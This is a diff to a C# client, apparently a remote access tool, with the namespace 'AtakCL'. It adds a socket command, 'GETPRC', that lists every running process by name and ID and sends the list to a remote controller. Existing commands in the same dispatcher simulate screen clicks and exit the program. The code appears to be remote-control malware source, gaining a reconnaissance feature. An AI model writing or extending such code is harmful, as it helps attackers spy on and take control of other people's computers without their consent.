@@ -118,6 +118,16 @@ namespace AtakCL
                             Thread t6 = new Thread(() => clickScreen(sData[1], sData[2]));
                             t6.Start();
                             break;
+                        case "GETPRC":
+                            Process[] processlist = Process.GetProcesses();
+                            socket.Send(Encoding.UTF8.GetBytes("PPPNUM|" + processlist.Length));
+                            string full = "";
+                            foreach (Process p in processlist)
+                            {
+                                full += p.ProcessName + "|" + p.Id + "|";                               
+                            }
+                            socket.Send(Encoding.UTF8.GetBytes("PPP" + full));
+                            break;
                         case "CLOSE":
                             Environment.Exit(0);
                             break;
